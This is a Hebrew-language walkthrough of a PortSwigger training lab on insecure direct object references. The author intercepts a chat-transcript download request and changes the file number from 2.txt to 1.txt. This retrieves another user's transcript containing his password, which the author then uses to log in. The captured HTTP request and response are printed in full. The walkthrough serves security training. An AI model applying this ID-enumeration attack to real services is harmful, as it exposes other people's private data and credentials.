הסימולציה שאני עושה נמצאת באתר portswigger, שנקרא: Lab: Insecure direct object references.

קצת על המטרה: 
```
המטרה משתמשת בממשק צאט של support 
ומאחסן על עצמו את הלוגים של הצאט 
שניתן להוריד בהמצאות כתובת המובילה לכתובת
הורדה סטטית

פתור את החדר
על ידי זה שתמצא את הססמא של קרלוס
ותכנס לחשבון שלו
```

### פיתרון מלא:

<img width="1808" height="787" alt="Pasted image 20260329162250" src="https://github.com/user-attachments/assets/843bc5e7-0230-4693-9341-0329b18708e1" />

איך שמתחילים אפשר לראות את החנות עצמה ועוד 2 דפים
- ו- My account
- ו- Live chat

לאחר שנכנסים ללייב צאט רואים את הדבר הבא:
![[צילום מסך 2026-03-29 155157.png]]

אמרו לנו שיש כפתור שמוריד למחשב את הלוגים של הצאט בעזרת כתובת סטטית, הכפתור ההוא היה View transcript לאחר שלחצתי עליו תפסתי את הבקשה וראיתי משהו מעניין:
``` http
GET /download-transcript/2.txt HTTP/2
Host: 0a20005203e548f381a703d500410022.web-security-academy.net
Cookie: session=bmDH1qrzw8Nm49cBOpHb4lifMnpkvw9e
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a20005203e548f381a703d500410022.web-security-academy.net/chat
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```

אני רואה שהוא מוריד את הקובץ שמוחזק במערכת באופן כזה:
ו- GET /download-transcript/2.txt HTTP/2
והשם של הקובץ הוא דינאמי, אחרת למה שהמערכת תקרא לו 2?
ניסיתי לשנות את הבקשה ל- 1.txt 
וקיבלתי את התגובה הבאה מהשרת:

``` http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
X-Frame-Options: SAMEORIGIN
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is p1051vioy4x0diie1huu. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

אוקיי עכשיו אנחנו רואים משהו שלא היינו צריכים לראות, והצלחנו להוריד לוג של הצאט שירות לקוחות עם קרלוס.
אנחנו יכולים לראות את הסיסמא שקרלוס שכח, ועל ידי כך להתחבר למשתמש שלו: `p1051vioy4x0diie1huu`

![[Pasted image 20260329165156.png]]

על ידי כך אנחנו יכולים לראות שהצלחנו להתחבר ופתרנו את החדר.
